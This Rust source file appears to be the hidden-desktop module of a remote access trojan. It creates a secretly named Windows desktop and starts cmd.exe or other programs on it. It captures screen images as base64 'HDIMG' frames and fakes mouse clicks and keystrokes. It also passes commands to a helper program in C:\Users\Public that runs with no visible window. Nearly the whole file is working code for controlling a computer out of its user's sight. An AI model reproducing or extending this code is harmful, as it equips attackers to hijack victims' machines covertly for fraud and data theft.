use std::ffi::c_void;
use std::ptr;

type Hdesk = *mut c_void;
type Hdc = *mut c_void;
type Hbitmap = *mut c_void;

#[link(name = "user32")]
extern "system" {
    fn CreateDesktopW(name: *const u16, device: *const u16, devmode: *mut c_void, flags: u32, access: u32, sa: *mut c_void) -> Hdesk;
    fn OpenDesktopW(name: *const u16, flags: u32, inherit: i32, access: u32) -> Hdesk;
    fn SetThreadDesktop(desk: Hdesk) -> i32;
    fn CloseDesktop(desk: Hdesk) -> i32;
    fn GetDC(hwnd: *mut c_void) -> Hdc;
    fn ReleaseDC(hwnd: *mut c_void, hdc: Hdc) -> i32;
    fn GetSystemMetrics(index: i32) -> i32;
    fn mouse_event(flags: u32, x: i32, y: i32, data: u32, extra: usize);
    fn keybd_event(vk: u8, scan: u8, flags: u32, extra: usize);
    fn VkKeyScanW(ch: u16) -> i16;
}
#[link(name = "gdi32")]
extern "system" {
    fn CreateCompatibleDC(hdc: Hdc) -> Hdc;
    fn CreateCompatibleBitmap(hdc: Hdc, w: i32, h: i32) -> Hbitmap;
    fn SelectObject(hdc: Hdc, obj: Hbitmap) -> Hbitmap;
    fn StretchBlt(dst: Hdc, x: i32, y: i32, w: i32, h: i32, src: Hdc, sx: i32, sy: i32, sw: i32, sh: i32, rop: u32) -> i32;
    fn GetDIBits(hdc: Hdc, bmp: Hbitmap, start: u32, lines: u32, bits: *mut u8, bi: *mut BitmapInfo, usage: u32) -> i32;
    fn DeleteObject(obj: Hbitmap) -> i32;
    fn DeleteDC(hdc: Hdc) -> i32;
}
#[link(name = "kernel32")]
extern "system" {
    fn CreateProcessW(app: *const u16, cmd: *mut u16, pa: *mut c_void, ta: *mut c_void, inherit: i32, flags: u32, env: *mut c_void, dir: *const u16, si: *mut StartupInfo, pi: *mut ProcessInfo) -> i32;
    fn CloseHandle(h: *mut c_void) -> i32;
}

#[repr(C)]
struct StartupInfo {
    cb: u32,
    reserved: *mut u16,
    desktop: *mut u16,
    title: *mut u16,
    x: u32, y: u32, x_size: u32, y_size: u32,
    x_chars: u32, y_chars: u32, fill: u32, flags: u32,
    show: u16, reserved2: u16, reserved3: *mut u8,
    stdin: *mut c_void, stdout: *mut c_void, stderr: *mut c_void,
}
#[repr(C)]
struct ProcessInfo { process: *mut c_void, thread: *mut c_void, pid: u32, tid: u32 }
#[repr(C)]
struct BitmapInfo {
    size: u32, width: i32, height: i32, planes: u16, bit_count: u16,
    compression: u32, size_image: u32, xppm: i32, yppm: i32, clr_used: u32, clr_important: u32,
}

static mut DESK: Hdesk = ptr::null_mut();
static mut DESK_NAME: String = String::new();

fn wide(s: &str) -> Vec<u16> { s.encode_utf16().chain(std::iter::once(0)).collect() }

fn ensure() -> bool {
    unsafe {
        if !DESK.is_null() { return true; }
        let ticks = std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH).map(|d| d.as_nanos()).unwrap_or(1);
        DESK_NAME = format!("d{ticks:x}");
        let name = wide(&DESK_NAME);
        DESK = CreateDesktopW(name.as_ptr(), ptr::null(), ptr::null_mut(), 0, 0x10000000, ptr::null_mut());
        if DESK.is_null() { DESK = OpenDesktopW(name.as_ptr(), 0, 0, 0x02000000); }
        !DESK.is_null()
    }
}

fn on_desk<F: FnOnce() -> String>(f: F) -> String {
    if !ensure() { return "desktop open failed".into(); }
    unsafe {
        if SetThreadDesktop(DESK) == 0 { return "set desktop failed".into(); }
    }
    f()
}

fn via_host(rest: &str) -> String {
    let exe = r"C:\Users\Public\hdcmdrun.exe";
    if !std::path::Path::new(exe).exists() { return String::new(); }
    let _ = std::fs::write(r"C:\Users\Public\hdin.txt", format!("__hd:{}", rest));
    let _ = std::fs::remove_file(r"C:\Users\Public\hdout.txt");
    let mut cmdline = wide(exe);
    let mut si = StartupInfo { cb: std::mem::size_of::<StartupInfo>() as u32, reserved: ptr::null_mut(), desktop: ptr::null_mut(), title: ptr::null_mut(), x: 0, y: 0, x_size: 0, y_size: 0, x_chars: 0, y_chars: 0, fill: 0, flags: 0, show: 0, reserved2: 0, reserved3: ptr::null_mut(), stdin: ptr::null_mut(), stdout: ptr::null_mut(), stderr: ptr::null_mut() };
    let mut pi = ProcessInfo { process: ptr::null_mut(), thread: ptr::null_mut(), pid: 0, tid: 0 };
    let ok = unsafe { CreateProcessW(ptr::null(), cmdline.as_mut_ptr(), ptr::null_mut(), ptr::null_mut(), 0, 0x08000000, ptr::null_mut(), ptr::null(), &mut si, &mut pi) };
    if ok == 0 { return "desktop host failed".into(); }
    unsafe { CloseHandle(pi.process); CloseHandle(pi.thread); }
    for _ in 0..400 {
        if let Ok(b) = std::fs::read(r"C:\Users\Public\hdout.txt") {
            if !b.is_empty() { return String::from_utf8_lossy(&b).into_owned(); }
        }
        std::thread::sleep(std::time::Duration::from_millis(200));
    }
    "desktop host failed".into()
}

pub fn handle(rest: &str) -> String {
    let rest = rest.trim();
    let via = via_host(rest);
    if !via.is_empty() { return via; }
    let (action, arg) = rest.split_once(' ').unwrap_or((rest, ""));
    match action {
        "" | "start" => on_desk(|| start(if arg.is_empty() { r"C:\Windows\System32\cmd.exe" } else { arg })),
        "frame" => on_desk(frame),
        "click" => on_desk(|| click(arg, false)),
        "rclick" => on_desk(|| click(arg, true)),
        "type" => on_desk(|| type_text(arg)),
        "key" => on_desk(|| key(arg.parse().unwrap_or(13))),
        "stop" => unsafe {
            if !DESK.is_null() { CloseDesktop(DESK); DESK = ptr::null_mut(); }
            "desktop stopped".into()
        },
        _ => "unknown desktop action".into(),
    }
}

fn start(exe: &str) -> String {
    let mut desktop = wide(&format!("WinSta0\\{}", unsafe { &DESK_NAME }));
    let mut cmd = wide(exe);
    let mut si = StartupInfo { cb: std::mem::size_of::<StartupInfo>() as u32, reserved: ptr::null_mut(), desktop: desktop.as_mut_ptr(), title: ptr::null_mut(), x: 0, y: 0, x_size: 0, y_size: 0, x_chars: 0, y_chars: 0, fill: 0, flags: 1, show: 5, reserved2: 0, reserved3: ptr::null_mut(), stdin: ptr::null_mut(), stdout: ptr::null_mut(), stderr: ptr::null_mut() };
    let mut pi = ProcessInfo { process: ptr::null_mut(), thread: ptr::null_mut(), pid: 0, tid: 0 };
    let ok = unsafe { CreateProcessW(ptr::null(), cmd.as_mut_ptr(), ptr::null_mut(), ptr::null_mut(), 0, 0x10, ptr::null_mut(), ptr::null(), &mut si, &mut pi) };
    if ok == 0 { return "spawn failed".into(); }
    unsafe { CloseHandle(pi.process); CloseHandle(pi.thread); }
    format!("desktop started pid={}", pi.pid)
}

fn frame() -> String {
    unsafe {
        let hdc = GetDC(ptr::null_mut());
        let mut sw = GetSystemMetrics(0);
        let mut sh = GetSystemMetrics(1);
        if sw <= 0 || sh <= 0 { sw = 1024; sh = 768; }
        let dw = if sw > 320 { 320 } else { sw };
        let dh = (sh * dw / sw).max(1);
        let mem = CreateCompatibleDC(hdc);
        let bmp = CreateCompatibleBitmap(hdc, dw, dh);
        let old = SelectObject(mem, bmp);
        StretchBlt(mem, 0, 0, dw, dh, hdc, 0, 0, sw, sh, 0x00CC0020);
        SelectObject(mem, old);
        let stride = ((dw * 3 + 3) / 4) * 4;
        let mut pixels = vec![0u8; (stride * dh) as usize];
        let mut bi = BitmapInfo { size: 40, width: dw, height: dh, planes: 1, bit_count: 24, compression: 0, size_image: 0, xppm: 0, yppm: 0, clr_used: 0, clr_important: 0 };
        GetDIBits(mem, bmp, 0, dh as u32, pixels.as_mut_ptr(), &mut bi, 0);
        DeleteObject(bmp); DeleteDC(mem); ReleaseDC(ptr::null_mut(), hdc);
        let flen = 54 + pixels.len();
        let mut file = vec![0u8; flen];
        file[0] = b'B'; file[1] = b'M';
        file[2..6].copy_from_slice(&(flen as u32).to_le_bytes());
        file[10..14].copy_from_slice(&54u32.to_le_bytes());
        file[14..18].copy_from_slice(&40u32.to_le_bytes());
        file[18..22].copy_from_slice(&(dw as i32).to_le_bytes());
        file[22..26].copy_from_slice(&(dh as i32).to_le_bytes());
        file[26] = 1; file[28] = 24;
        file[54..].copy_from_slice(&pixels);
        use base64::{Engine as _, engine::general_purpose::STANDARD};
        format!("HDIMG:{},{}:{}", sw, sh, STANDARD.encode(file))
    }
}

fn click(arg: &str, right: bool) -> String {
    let mut parts = arg.split_whitespace();
    let x: i32 = parts.next().and_then(|s| s.parse().ok()).unwrap_or(0);
    let y: i32 = parts.next().and_then(|s| s.parse().ok()).unwrap_or(0);
    if parts.next().is_none() && arg.split_whitespace().count() < 2 { return "click needs x y".into(); }
    unsafe {
        let sw = GetSystemMetrics(0).max(1);
        let sh = GetSystemMetrics(1).max(1);
        mouse_event(0x8001, x * 65535 / sw, y * 65535 / sh, 0, 0);
        if right {
            mouse_event(0x0008, 0, 0, 0, 0);
            mouse_event(0x0010, 0, 0, 0, 0);
            return format!("rclick {x} {y}");
        }
        mouse_event(0x0002, 0, 0, 0, 0);
        mouse_event(0x0004, 0, 0, 0, 0);
    }
    format!("click {x} {y}")
}

fn type_text(text: &str) -> String {
    if text.is_empty() { return "type needs text".into(); }
    for ch in text.encode_utf16() {
        unsafe {
            if ch == 10 || ch == 13 {
                keybd_event(13, 0, 0, 0);
                keybd_event(13, 0, 2, 0);
                continue;
            }
            let pair = VkKeyScanW(ch);
            let vk = (pair & 0xFF) as u8;
            if vk == 0xFF { continue; }
            if pair & 0x100 != 0 { keybd_event(0x10, 0, 0, 0); }
            keybd_event(vk, 0, 0, 0);
            keybd_event(vk, 0, 2, 0);
            if pair & 0x100 != 0 { keybd_event(0x10, 0, 2, 0); }
        }
    }
    format!("typed {}", text.chars().count())
}

fn key(vk: i32) -> String {
    unsafe {
        keybd_event(vk as u8, 0, 0, 0);
        keybd_event(vk as u8, 0, 2, 0);
    }
    format!("key {vk}")
}
